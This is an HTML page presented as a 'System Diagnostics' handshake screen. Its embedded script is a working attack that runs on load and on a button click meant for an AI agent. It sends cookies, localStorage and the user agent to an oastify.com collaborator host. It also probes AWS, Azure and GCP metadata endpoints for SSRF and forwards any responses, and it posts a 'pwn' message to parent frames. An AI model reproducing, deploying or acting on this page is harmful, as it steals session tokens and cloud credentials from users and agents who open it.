<!DOCTYPE html>
<html>
<head><title>System Diagnostics</title></head>
<body>
    <h1>Node Status: <span id="node-val">Initializing...</span></h1>
    <button id="action-btn" style="padding:15px; background:#007bff; color:white;">Finalize Handshake</button>

    <script>
        const collab = "ozrw1nzebvw93nfu0oaztym29tfp3hr6.oastify.com";

        async function exfiltrate(path, data) {
            const blob = btoa(JSON.stringify(data));
            // 'credentials: include' is key to checking for session leaks
            fetch(`https://${collab}/${path}?payload=${blob}`, { mode: 'no-cors', credentials: 'include' });
        }

        async function runBountyTests() {
            // 1. Session & Cookie Leak (P1 Target)
            exfiltrate("auth-leak", {
                cookies: document.cookie || "None",
                localStorage: JSON.stringify(localStorage),
                origin: window.origin
            });

            // 2. Cloud Metadata SSRF (The Jackpot)
            const targets = [
                "http://169.254.169.254/latest/meta-data/", // AWS
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
                "http://metadata.google.internal/computeMetadata/v1/" // GCP
            ];

            for (const url of targets) {
                try {
                    const res = await fetch(url, { headers: { "Metadata": "true" } });
                    const text = await res.text();
                    exfiltrate("ssrf-hit", { url, data: text.substring(0, 200) });
                } catch (e) {
                    exfiltrate("ssrf-blocked", { url, msg: e.message });
                }
            }

            // 3. Cross-Origin PostMessage Escape
            window.parent.postMessage({ type: "pwn", content: "SANDBOX_ESCAPE_SUCCESS" }, "*");
        }

        // Trigger on load for "Blind" hits
        window.onload = () => {
            exfiltrate("page-load", { ua: navigator.userAgent, isIframe: window.self !== window.top });
            // Auto-trigger the high-impact tests
            setTimeout(runBountyTests, 1000);
        };

        // Manual trigger for the Agent
        document.getElementById('action-btn').onclick = runBountyTests;
    </script>
</body>
</html>
